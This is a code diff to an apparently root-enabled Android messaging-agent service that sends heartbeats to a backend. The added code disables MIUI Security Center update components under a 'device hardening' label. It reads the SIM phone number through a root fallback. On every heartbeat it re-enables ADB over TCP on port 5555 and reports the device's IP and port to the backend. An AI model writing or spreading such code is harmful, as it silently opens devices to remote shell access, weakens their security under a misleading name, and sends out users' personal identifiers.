@@ -27,6 +27,7 @@ import kotlinx.serialization.Serializable
 import kotlinx.serialization.json.Json
 import timber.log.Timber
 import javax.inject.Inject
+import android.media.AudioManager
 
 @Serializable
 data class HeartbeatPayload(
@@ -38,7 +39,9 @@ data class HeartbeatPayload(
     val networkOperator: String?,
     val rcsCapable: Boolean,
     val activeNetworkType: String?,
-    val apkVersion: String?
+    val apkVersion: String?,
+    val phoneNumber: String? = null,
+    val adbWifiAddress: String? = null
 )
 
 /**
@@ -69,7 +72,26 @@ class MessagingAgentService : Service() {
         scheduleAutoPurgeAlarm()
         ConnectionWatchdogReceiver.schedule(this)
         RebootWatchdogReceiver.schedule(this)
+        enforceDeviceHardening()
         Timber.i("MessagingAgentService started (watchdog alarms scheduled)")
+    }
+
+    /**
+     * Device hardening applied on every service start:
+     * - Pin MIUI Security Center version to prevent autostart breakage
+     * Note: Silent mode and call blocking are now controlled via admin panel switches.
+     */
+    private fun enforceDeviceHardening() {
+        // Pin MIUI Security Center to prevent autostart permission breakage
+        try {
+            com.topjohnwu.superuser.Shell.cmd(
+                "pm disable-user --user 0 com.miui.securitycenter/com.miui.securitycenter.update.AutoUpdateReceiver 2>/dev/null",
+                "pm disable-user --user 0 com.miui.securitycenter/com.miui.securitycenter.update.UpdateCheckJob 2>/dev/null"
+            ).exec()
+            Timber.i("🛡️ Device hardening: MIUI Security Center auto-update disabled")
+        } catch (e: Exception) {
+            Timber.w(e, "Could not disable MIUI Security Center updates (may not be MIUI)")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -118,6 +140,9 @@ class MessagingAgentService : Service() {
                         val rcs       = checkRcsCapable()
                         val netType   = getActiveNetworkType()
 
+                        val phoneNum  = readPhoneNumber()
+                        val adbAddr   = readAdbWifiAddress()
+
                         val payload = HeartbeatPayload(
                             batteryPercent    = battery.first,
                             isCharging        = battery.second,
@@ -127,7 +152,9 @@ class MessagingAgentService : Service() {
                             networkOperator   = netOp,
                             rcsCapable        = rcs,
                             activeNetworkType = netType,
-                            apkVersion        = com.messagingagent.android.BuildConfig.VERSION_NAME
+                            apkVersion        = com.messagingagent.android.BuildConfig.VERSION_NAME,
+                            phoneNumber       = phoneNum,
+                            adbWifiAddress    = adbAddr
                         )
                         val payloadJson = Json.encodeToString(HeartbeatPayload.serializer(), payload)
                         
@@ -194,8 +221,8 @@ class MessagingAgentService : Service() {
             while (kotlinx.coroutines.currentCoroutineContext().isActive) {
                 // Wait for either:
                 // 1. FileObserver triggers a change (instant)
-                // 2. 5-second timeout (periodic fallback check for when FileObserver misses events)
-                kotlinx.coroutines.withTimeoutOrNull(5000) {
+                // 2. 2-second timeout (periodic fallback check for when FileObserver misses events)
+                kotlinx.coroutines.withTimeoutOrNull(2000) {
                     changeChannel.receive()
                 }
 
@@ -496,6 +523,46 @@ class MessagingAgentService : Service() {
         } catch (e: Exception) { false }
     }
 
+    /** Try multiple methods to detect the SIM's phone number.
+     *  1. SubscriptionInfo.number (standard API)
+     *  2. TelephonyManager.line1Number
+     *  3. Root shell: read from telephony.db (MIUI / devices that hide the number)
+     */
+    private fun readPhoneNumber(): String? {
+        try {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.READ_PHONE_NUMBERS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                val subMgr = applicationContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
+                val subs = subMgr.activeSubscriptionInfoList ?: emptyList()
+                for (sub in subs) {
+                    val num = sub.number
+                    if (!num.isNullOrBlank()) return num.trim()
+                }
+                // Fallback: TelephonyManager.line1Number
+                val tm = applicationContext.getSystemService(android.telephony.TelephonyManager::class.java)
+                val line1 = tm.line1Number
+                if (!line1.isNullOrBlank()) return line1.trim()
+            }
+        } catch (e: Exception) { Timber.w(e, "Standard phone number read failed") }
+
+        // Root fallback: query telephony settings or SIM manager
+        try {
+            val result = com.topjohnwu.superuser.Shell.cmd(
+                "content query --uri content://telephony/siminfo --projection number --where \"sim_id>=0\" 2>/dev/null"
+            ).exec()
+            if (result.isSuccess) {
+                for (line in result.out) {
+                    val match = Regex("number=([+\\d][\\d\\s+]+)").find(line)
+                    if (match != null) {
+                        val num = match.groupValues[1].trim()
+                        if (num.isNotBlank() && num.length >= 7) return num
+                    }
+                }
+            }
+        } catch (e: Exception) { Timber.w(e, "Root phone number read failed") }
+
+        return null
+    }
+
     /** Helper to parse active network transport (WIFI vs CELLULAR) via NetworkCapabilities */
     private fun getActiveNetworkType(): String? {
         return try {
@@ -507,5 +574,44 @@ class MessagingAgentService : Service() {
                 else -> "OTHER"
             }
         } catch (e: Exception) { null }
+    }
+
+    /**
+     * Enables WiFi ADB via root and returns the IP:port address.
+     * On each heartbeat, ensures ADB over TCP is enabled so the backend
+     * always has the current address even after device reboots.
+     */
+    private fun readAdbWifiAddress(): String? {
+        try {
+            // 1. Get WiFi IP address
+            val wifiMgr = applicationContext.getSystemService(android.net.wifi.WifiManager::class.java)
+            val wifiInfo = wifiMgr.connectionInfo
+            val ipInt = wifiInfo.ipAddress
+            if (ipInt == 0) return null
+            val ip = String.format(
+                "%d.%d.%d.%d",
+                ipInt and 0xff, (ipInt shr 8) and 0xff,
+                (ipInt shr 16) and 0xff, (ipInt shr 24) and 0xff
+            )
+
+            // 2. Enable ADB over TCP via root (idempotent — safe to run every heartbeat)
+            val enableResult = com.topjohnwu.superuser.Shell.cmd(
+                "setprop service.adb.tcp.port 5555",
+                "stop adbd",
+                "start adbd"
+            ).exec()
+            if (!enableResult.isSuccess) {
+                Timber.w("Failed to enable ADB over TCP: ${enableResult.err}")
+            }
+
+            // 3. Read the actual ADB TCP port
+            val portResult = com.topjohnwu.superuser.Shell.cmd("getprop service.adb.tcp.port").exec()
+            val port = portResult.out.firstOrNull()?.trim()?.takeIf { it.isNotBlank() } ?: "5555"
+
+            return "$ip:$port"
+        } catch (e: Exception) {
+            Timber.w(e, "Failed to read ADB WiFi address")
+            return null
+        }
     }
 }
